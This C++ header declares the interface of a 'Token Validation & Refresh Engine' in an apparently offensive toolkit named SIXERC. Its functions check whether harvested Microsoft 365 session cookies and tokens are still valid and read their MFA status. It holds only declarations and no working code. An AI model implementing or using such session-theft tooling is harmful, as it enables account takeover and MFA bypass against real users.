// ============================================================================
// SIXERC — Module 2: Token Validation & Refresh Engine (TVRE)
// Verifies harvested tokens and checks MFA/device posture
// ============================================================================

#pragma once

#include "core/types.hpp"
#include <vector>

namespace sixerc::tvre {

// Validate a single cookie as a token
M365Token validate_cookie(const SessionCookie& cookie);

// Check if a token is currently valid by making a lightweight request
bool check_token_validity(const std::string& token_value, const std::string& token_type);

// Attempt to extract MFA status from token claims
bool extract_mfa_status(const std::string& token_value);

// Full validation of all harvested sessions
std::vector<HarvestedSession> validate_sessions(const std::vector<HarvestedSession>& sessions);

} // namespace sixerc::tvre
